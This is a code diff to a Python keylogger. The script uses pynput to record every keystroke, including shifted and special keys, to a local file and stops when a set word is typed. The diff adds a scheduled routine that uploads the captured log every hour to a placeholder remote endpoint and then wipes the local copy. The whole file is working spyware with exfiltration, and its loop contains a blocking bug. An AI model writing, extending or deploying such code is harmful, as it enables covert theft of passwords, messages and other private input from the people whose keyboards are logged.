@@ -1,11 +1,16 @@
+import schedule
+import time
+import requests
 from pynput import keyboard
 import uuid
+
 # Define the sequence to stop the keylogger (case-sensitive)
 stop_sequence = "daddy"
 current_sequence = ""
 
 # Track Shift key state
 shift_pressed = False
+
 def get_mac_address():
     print("Getting MAC address...")
     mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
@@ -13,14 +18,14 @@ def get_mac_address():
 
 def on_press(key):
     global current_sequence, shift_pressed
-    
+
     try:
         # Handle Shift key state
         if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
             shift_pressed = True
         elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
             shift_pressed = False
-        
+
         # Handle regular character keys
         if hasattr(key, 'char') and key.char is not None:
             char = key.char
@@ -29,25 +34,25 @@ def on_press(key):
                 char = f"[SHIFT+{char.upper()}]"
             else:
                 char = char.lower()
-            
+
             # Append character to current sequence and check stop condition
             current_sequence += char
             if current_sequence[-len(stop_sequence):] == stop_sequence:
                 print(f"'{stop_sequence}' detected. Stopping keylogger.")
                 return False  # Stops the listener
-            
+
             # Write the character to the file
             with open("keyfile1.txt", 'a') as logKey:
                 logKey.write(char)
                 logKey.flush()  # Ensure data is written to disk immediately
-        
+
         # Handle space key
         elif key == keyboard.Key.space:
             current_sequence += ' '
             with open("keyfile1.txt", 'a') as logKey:
                 logKey.write(' ')
                 logKey.flush()  # Ensure data is written to disk immediately
-        
+
         # Handle other special keys
         else:
             special_key = str(key).replace("Key.", "")
@@ -65,7 +70,30 @@ def on_release(key):
     if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
         shift_pressed = False
 
-if _name_ == "_main_":
+def upload_file():
+    try:
+        with open("keyfile1.txt", 'rb') as file:
+            response = requests.post('YOUR_ENDPOINT_URL', files={'file': file})
+            if response.status_code == 200:
+                print("File uploaded successfully.")
+                response_data = response.json()
+                if response_data.get("success") == True:
+                    with open("keyfile1.txt", 'w') as file:
+                        file.write("")
+                    print("File contents wiped after successful upload.")
+            else:
+                print(f"Failed to upload file. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"Error during file upload: {e}")
+
+# Schedule the file upload every hour
+schedule.every().hour.do(upload_file)
+
+if __name__ == "__main__":
     listener = keyboard.Listener(on_press=on_press, on_release=on_release)
     listener.start()
-    listener.join()  # Keeps the program running until the keylogger is stopped
+    
+    while True:
+        schedule.run_pending()
+        time.sleep(1)
+        listener.join()  # Keeps the program running until the keylogger is stopped
